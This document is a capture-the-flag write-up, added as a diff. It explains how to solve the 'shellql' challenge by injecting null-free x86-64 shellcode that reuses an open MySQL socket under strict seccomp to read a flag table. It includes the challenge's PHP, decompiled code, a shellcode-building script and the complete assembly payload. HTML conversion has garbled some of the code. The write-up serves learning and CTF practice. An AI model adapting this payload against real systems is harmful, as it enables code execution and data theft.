@@ -1,0 +1,199 @@
+<h1>shellql</h1>
+
+<p>The challenge was basicaly shellcoding in the context of PHP under a sandbox to make SQL queries. </p>
+
+<hr />
+
+<p>They provide us with a shared object <code>shellme.so</code> and a website. By appending ?source to the index.php, the source is shown.</p>
+
+<p>This is the relevant source
+```php</p>
+
+<h1>!/usr/bin/php-cgi</h1>
+
+<p><?php</p>
+
+<p>if (isset($<em>GET['source']))
+{
+   show</em>source(<strong>FILE</strong>);
+   exit();
+}</p>
+
+<p>$link = mysqli_connect('localhost', 'shellql', 'shellql', 'shellql');</p>
+
+<p>if (isset($<em>POST['shell']))
+{
+   if (strlen($</em>POST['shell']) &lt;= 1000)
+   {
+      echo $<em>POST['shell'];
+      shellme($</em>POST['shell']);
+   }
+   exit();
+}
+```</p>
+
+<p>The main part is the our input from post request is passed to a <code>shellme()</code> function, which is defined in the shared object <code>shellme.so</code>.</p>
+
+<p>Opening <code>shellme.so</code> in our god IDA and following the shellme(), this is where it ends.</p>
+
+<p>```cpp
+<em>_int64 _</em>fastcall shell<em>this(void *src)
+{
+  size</em>t v1; // rbx
+  void *v2; // rbp</p>
+
+<p>v1 = (signed int)strlen((const char <em>)src);
+  v2 = mmap(0LL, v1, 7, 34, -1, 0LL);
+  memcpy(v2, src, v1);
+  alarm(0x1Eu);
+  prctl(22, 1LL);
+  return ((__int64 (</em>)(void))v2)();
+}
+```</p>
+
+<p>So our input is basically copied to a mmap-ed region, then a seccomp sandbox is activated ( with <code>SECCOMP_MODE_STRICT</code> ) and then our input is executed. The <code>SECCOMP_MODE_STRICT</code> only allowed read(), write() and exit() syscalls.</p>
+
+<p>Another thing is that it uses strlen(), which only reads upto null bytes. So we can't have null bytes in our shellcode or it'll be truncated.</p>
+
+<p>Looking at the php code again, we see that it already makes a connection with the mysql server before executing our shellcode and the description says that the flag is in the table <code>flag</code>. So the FD for the connection will already be open and we can write SQL queries to it and read the response.</p>
+
+<p>Since the server uses php-cgi, we first also have to write the php-cgi header, then send the sql query to the FD 4( of mysql server ), read the response and write it to stdout. </p>
+
+<p>By looking at the mysql <a href="https://dev.mysql.com/doc/internals/en/com-query.html">docs</a>, we figure out that the request consists something like this at the protocol level</p>
+
+<p><code>
+| little endian, 4 bytes, length of query | 1 byte query type (0x3 for this query) | Our Query |
+</code></p>
+
+<p>So we would send something like this to the mysql server</p>
+
+<p><code>
+|0x13 0x00 0x00 0x00 | 0x3 | Select * from flag |
+</code></p>
+
+<p>The plan is as follows then:
+- Write the cgi header ( Content-type: text/html )
+- Send the SQL query to fd 4 ( mysql server )
+- Read response from fd 4 ( mysql server )
+- Write the response received</p>
+
+<p>I set up a quick shellcode development environment, which basically compiles my assembly, warns me if there are any null bytes and then prints the shellcode representation. Here it is:</p>
+
+<p>```python
+import os</p>
+
+<p>asm = """</p>
+
+<p>;SHELLCODE HERE</p>
+
+<p>"""</p>
+
+<p>with open("test.asm", "w") as f:
+    f.write(asm)</p>
+
+<p>os.system("nasm test.asm")</p>
+
+<p>with open("test", "rb") as f:
+    assembled = f.read()</p>
+
+<p>hexCode = ""</p>
+
+<p>for byte in assembled:
+    hexCode += "\x"+byte.encode('hex')</p>
+
+<p>os.system("objdump -D -b binary test -m i386:x86-64 -M intel")</p>
+
+<p>if '\x00' in assembled:
+    print "NULL Bytes Found"</p>
+
+<p>print "\n\nASSEMBLED to the following:"
+print hexCode
+```</p>
+
+<p>The shellcode wasn't really a challenge, although I used some funky tricks to bypass NULL bytes at different places. I would write a 4 byte value to a register and then shift write so only the bytes I need are left</p>
+
+<p>I used the JMP - CALL - POP technique to get the strings in registers, but since the shellcode was kinda long, sometimes the small relative JMPs would end up as big JMPs( which used null bytes ), so I used a bunch of PLT type trampolines to make sure all the JMPs are small. </p>
+
+<p>Here is my final shellcode:</p>
+
+<p>```
+jmp string1Trampolene</p>
+
+<p>writeHeader:  ; writes the Header for php-cgi
+pop r11
+mov rax, 0x11111111
+shr rax, 28
+xor rdi, rdi
+inc rdi
+mov rsi, r11
+mov rdx, 0x24242424
+shr rdx, 24
+syscall
+jmp string2x2Trampolene ; Double trampolene of near jmps as far jmps have null bytes</p>
+
+<p>sendSql: ; Sends the sql query
+pop rsi
+mov eax, DWORD [rsi]
+shr eax, 24
+mov DWORD [rsi], eax
+mov rdi, 0x44444444  ; The file descriptor
+shr rdi, 28
+mov rax, 0x11111111  ; syscall number
+shr rax, 28
+mov rdx, 0x17171717 ; sets the length of query
+shr rdx, 24
+syscall
+jmp readResp
+nop</p>
+
+<p>string1Trampolene: ; trampolene
+jmp string1</p>
+
+<p>writeFlag: ; Writes the flag from stack
+mov rdx, rax ; same value read 
+mov rax, 0x11111111
+shr rax, 28
+xor rdi, rdi
+inc rdi
+mov rsi, rsp
+syscall
+jmp exitCode</p>
+
+<p>string2x2Trampolene: ; The trampolene
+jmp string2Trampolene</p>
+
+<p>readResp: ; reads the response from sql server
+mov rax, 0x10101010
+shr rax, 20
+sub rsp, rax
+xor rax, rax
+mov rdi, 0x44444444  ; File descriptor 4
+shr rdi, 28
+mov rsi, rsp
+mov rdx, 0x10101010 
+shr rdx, 20
+dec rdx ; sets rdx to 100
+syscall
+jmp writeFlag
+nop</p>
+
+<p>exitCode:
+mov rax, 0x3c3c3c3c
+shr rax, 24
+xor rdi, rdi
+syscall</p>
+
+<p>string2Trampolene:
+jmp string2</p>
+
+<p>string1:
+call writeHeader
+db "Content-type: text/html",0x0a,0x0a,0x0a,0x0a,"r00t3d",0xa,0xa,0xa</p>
+
+<p>string2:
+call sendSql
+db 0x13,0x13,0x13,0x13,0x3,"Select * from flag"</p>
+
+<p>```</p>
+
+<p>By Jazzy</p>
